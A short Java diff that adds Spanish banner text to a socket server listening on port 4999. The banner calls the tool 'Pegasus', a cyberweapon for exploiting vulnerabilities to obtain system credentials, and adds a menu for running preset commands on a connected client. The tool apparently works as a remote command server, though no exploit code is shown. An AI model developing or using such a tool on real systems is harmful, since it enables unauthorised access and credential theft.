@@ -24,9 +24,14 @@ public class Ser {
     public static void main(String[] args) throws IOException {
         ServerSocket ss = new ServerSocket(4999);
         Socket s = ss.accept();
+        System.out.println("Bienvenido a Pegasus.");
+        System.out.println("Pegasus es una cyberArma diseñada para la busqueda y explotacion de vulnerabilidades, en este caso");
+        System.out.println("Explotaremos la vulnerabilidad para obtener las credenciales de acceso al sistema.");
+        System.out.println("NOsotros no nos hacemos responsables por el mal uso que se le de a este software.");
         try {
             while (true) {
                 System.out.println("Cliene conectado ");
+                System.out.println("Si desea correr comandos ya establecidos, marque 1.");
                 BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
                 String linea = stdIn.readLine();
 
